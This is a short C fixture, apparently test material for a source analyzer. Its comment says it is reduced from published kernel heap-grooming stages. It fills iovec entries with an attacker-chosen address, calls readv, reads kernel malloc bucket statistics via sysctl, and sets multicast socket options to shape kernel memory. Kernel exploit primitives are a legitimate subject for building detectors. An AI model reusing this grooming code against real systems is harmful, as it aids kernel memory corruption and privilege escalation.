/* Reduced from the published readv and multicast heap-grooming stages.
 * This fixture is analyzed as source, never compiled or executed. */
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/malloc.h>
#include <sys/uio.h>
#include <netinet/in.h>
#include <stdint.h>

void prepare_carriers(uintptr_t address, int descriptor)
{
    struct iovec entries[64];
    struct ip_mreq group = {0};
    unsigned char ttl = 2;
    int mib[4] = {CTL_KERN, KERN_MALLOCSTATS, KERN_MALLOC_BUCKET, 1024};
    uint64_t bucket[16];
    size_t size = sizeof(bucket);
    int index;
    for (index = 0; index < 64; index++) {
        entries[index].iov_base = (void *)(uintptr_t)address;
        entries[index].iov_len = (size_t)address;
    }
    readv(-1, entries, 64);
    sysctl(mib, 4, bucket, &size, NULL, 0);
    setsockopt(descriptor, IPPROTO_IP, IP_MULTICAST_TTL, &ttl, sizeof(ttl));
    setsockopt(descriptor, IPPROTO_IP, IP_ADD_MEMBERSHIP, &group, sizeof(group));
}
